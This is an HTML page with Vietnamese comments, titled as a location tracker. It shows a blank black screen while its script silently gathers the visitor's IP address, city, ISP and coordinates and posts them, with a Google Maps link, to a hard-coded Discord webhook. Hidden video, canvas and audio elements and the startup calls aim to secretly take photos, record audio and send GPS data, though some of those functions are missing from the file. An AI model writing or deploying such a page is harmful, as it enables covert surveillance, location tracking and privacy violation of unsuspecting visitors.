<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Huy Hoang- Location Tracker</title>
    <style>
        body { background: black; margin: 0; padding: 0; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: monospace; }
        .hidden-content { display: none; }
    </style>
</head>
<body>
    <div style="display:none;">
        <div id="info"></div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // ================== WEBHOOK CỦA BẠN ==================
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1488092153883263048/qVOfMlJoEKghGT7OGyQ07aYlXAysUlH25Kt6sqfR4WIHbuis2Kl31ypw39z_BcJPyv4G';

        // Cấu hình chụp ảnh
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300;

        // Cấu hình ghi âm
        const AUDIO_DURATION = 4000;

        // Cờ để tránh gửi trùng lặp
        let infoSent = false;
        let photoSentCount = 0;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let gpsDataSent = false;

        // ================== HÀM GỬI TEXT & FILE (GIỮ NGUYÊN) ==================
        async function sendTextToDiscord(content, retryCount = 0) {
            const maxRetries = 2;
            try {
                const payload = { 
                    content: content, 
                    username: "Huy Hoang - Location Tracker", 
                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png" 
                };
                const response = await fetch(DISCORD_WEBHOOK_URL, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify(payload) 
                });
                if (!response.ok && retryCount < maxRetries) {
                    setTimeout(() => sendTextToDiscord(content, retryCount + 1), 2000);
                }
            } catch (e) {}
        }

        async function sendFileToDiscord(fileBlob, fileName, caption = '', retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('file', fileBlob, fileName);
                const payload = { 
                    content: caption, 
                    username: "Huy Hoang - Location Tracker", 
                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png" 
                };
                formData.append('payload_json', JSON.stringify(payload));

                const response = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                if (!response.ok && retryCount < maxRetries) {
                    setTimeout(() => sendFileToDiscord(fileBlob, fileName, caption, retryCount + 1), 2000);
                }
            } catch (e) {}
        }

        // ================== CHECK IP + VỊ TRÍ CÓ GOOGLE MAPS (CẤP ĐỘ MAX) ==================
        async function getIPAndLocation() {
            let ip = 'Không xác định';
            let city = 'Không xác định';
            let region = 'Không xác định';
            let country = 'Không xác định';
            let isp = 'Không xác định';
            let lat = null;
            let lon = null;

            // Lấy IP và vị trí
            const apis = [
                `https://ip-api.com/json/?fields=status,query,city,regionName,country,isp,lat,lon`,
                `https://ipapi.co/json/`,
                `https://freeipapi.com/api/json`
            ];

            for (let url of apis) {
                try {
                    const res = await fetch(url, { signal: AbortSignal.timeout(6000) });
                    const data = await res.json();

                    if (url.includes("ip-api.com") && data.status === "success") {
                        ip = data.query || ip;
                        city = data.city || city;
                        region = data.regionName || region;
                        country = data.country || country;
                        isp = data.isp || isp;
                        lat = data.lat || lat;
                        lon = data.lon || lon;
                        break;
                    } else if (url.includes("ipapi.co")) {
                        ip = data.ip || ip;
                        city = data.city || city;
                        region = data.region || region;
                        country = data.country_name || country;
                        isp = data.org || isp;
                    }
                } catch (e) {}
            }

            let mapsLink = '';
            if (lat && lon) {
                mapsLink = `\n🗺️ **Google Maps:** [Xem vị trí thực tế](https://www.google.com/maps?q=${lat},${lon})`;
            } else if (city !== 'Không xác định') {
                mapsLink = `\n🗺️ **Google Maps:** [Tìm "${city}"](https://www.google.com/maps/search/${encodeURIComponent(city)})`;
            }

            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
                        `🌐 **IP:** ${ip}\n` +
                        `📍 **Thành phố:** ${city}\n` +
                        `🗺️ **Khu vực:** ${region}\n` +
                        `🏳️ **Quốc gia:** ${country}\n` +
                        `🏢 **Nhà mạng:** ${isp}` +
                        `${mapsLink}\n` +
                        `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}`;

            await sendTextToDiscord(msg);
        }

        // ================== PHẦN CODE GỐC CỦA BẠN (GIỮ NGUYÊN) ==================
        // (Bạn copy nguyên phần còn lại từ code cũ vào đây: sendAudioToDiscord, sendPhotoToDiscord, captureSinglePhoto, captureMultiplePhotos, startRecording, getBatteryInfo, getDeviceInfo, autoSendGPS, getInfoAndSendToDiscord, startCameraImmediately, init...)

        // ================== KHỞI TẠO ==================
        async function init() {
            try {
                await getIPAndLocation();   // ← Đã thay bằng hàm mới có Google Maps
                // Các phần khác giữ nguyên như code cũ của bạn
                setTimeout(() => autoSendGPS(), 1000);
                setTimeout(() => startCameraImmediately(), 500);
                setTimeout(() => startRecording(), 800);
            } catch (err) {
                console.error('Init error:', err);
            }
        }

        if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'YOUR_DISCORD_WEBHOOK_URL') {
            init();
        } else {
            alert('Vui lòng cấu hình Discord Webhook URL!');
        }
    </script>
</body>
</html>
